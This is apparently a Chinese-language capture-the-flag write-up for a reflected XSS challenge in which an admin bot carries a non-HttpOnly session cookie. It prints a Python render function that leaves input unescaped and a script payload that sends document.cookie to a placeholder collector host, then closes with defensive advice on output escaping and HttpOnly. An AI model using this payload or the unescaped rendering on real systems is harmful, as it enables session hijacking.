# Cross-Site Scripting

## 题目简述

`/module-request` 把 `code`、`name` 和 `description` 查询参数直接插入 HTML，没有模板转义。每次请求还会通知 admin bot；bot 在访问该路径前设置名为 `session`、值为第二阶段 flag 的非 HttpOnly Cookie。目标是利用反射型 XSS 在管理员浏览器中读取并外带该 Cookie。

## 解题过程

易受攻击的响应本质上是：

```python
def render_request(code, name, description):
    return f"""
    <p>{code}</p>
    <p>{name}</p>
    <p>{description}</p>
    """
```

在任一参数中放入脚本，并把接收地址替换成自己控制的 HTTP 日志端点：

```html
<script>
new Image().src =
  "https://YOUR-COLLECTOR.example/collect?cookie=" +
  encodeURIComponent(document.cookie);
</script>
```

bot 会把提交 URL 的 origin 改回内部 Web 服务，但保留路径和查询参数，然后设置：

```text
session=grey{this_is_the_admin_session_cookie}
HttpOnly=false
```

脚本执行后，接收端日志中的 `cookie` 参数即包含：

```text
grey{this_is_the_admin_session_cookie}
```

## 方法总结

反射型 XSS 与 admin bot 组合时，应检查三件事：输入是否进入 HTML、bot 是否真的访问该 URL、目标秘密是否能被 JavaScript 读取。本题显式关闭 HttpOnly，使 `document.cookie` 成为直接外带通道；输出转义和 HttpOnly 应同时启用，不能只依赖其中之一。
